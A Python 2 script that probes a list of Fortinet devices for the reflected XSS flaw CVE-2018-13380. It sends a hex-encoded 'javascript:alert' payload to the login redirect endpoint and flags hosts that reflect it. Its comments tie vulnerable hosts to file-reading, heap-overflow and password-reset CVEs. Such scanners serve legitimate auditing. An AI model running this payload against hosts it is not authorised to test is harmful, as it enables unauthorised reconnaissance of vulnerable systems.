#!/usr/bin/python
#
# Check if Fortinet device is vulnerable to XSS (CVE-2018-13380)
# if the target is vulnerable, it is also probably vulnerable to CVE-2018-13379
# (Pre-auth arbitrary file reading) and CVE-2018-13382 (Post-auth heap overflow)
# and CVE-2018-13383 (Modify any users password with magic key) since
# all those were fixed on the same update.
#
#
import os 
import re
import sys
import requests
import time
import datetime
import urlparse

def printhelp():
    
    print "Usage #1: ./cmd_detectpreauthvuln_fortinet.py --hostfile=<DOMAINFILE>"
    print "\t --hostfile param: a file that holds list of hostnames / ipaddresses that the script will check"
    
    exit(0)    

def readfile(infile):
    
    hostfile = open(infile,"r")
    filedata=[]
    for line in hostfile.readlines():
        filedata.append(line.rstrip())    
    return filedata


def testVuln(url):

    testurl = url + "remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29"
    print "[*] Checking " + url
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0' }        
    response = requests.get(testurl,headers=headers,verify=False,timeout=30,allow_redirects=False)
    statuscode = response.status_code
    data = response.content
    detectstring = """document.location=decodeURIComponent("javascript%3Aalert%28document.domain%29")"""
    if statuscode == 200 and detectstring in data:
        print "\t[*] !!! Vulnerable URL: " + url + " !!!"
    

if __name__ == '__main__':
   
    if len(sys.argv) != 1 or sys.argv[1] == "--help":
        if sys.argv[1] == "--help":
            printhelp()
            exit(0)
    
    readFromFile = False
    if '--hostfile=' in sys.argv[1]:
        readFromFile = True
        hostfile = sys.argv[1].split("=")[1]
        hostfiledata = readfile(hostfile)

    if readFromFile == True:
        for item in hostfiledata:
            url = "https://" + item + "/"
            print "[*] Testing " + url
            testVuln(url)
            
    if readFromFile == False:
        print "[*] Enumerating single host (" + sys.argv[1] + ")."
        url = "https://" + sys.argv[1] + "/"
        testVuln(url)

    print "[*] Done!"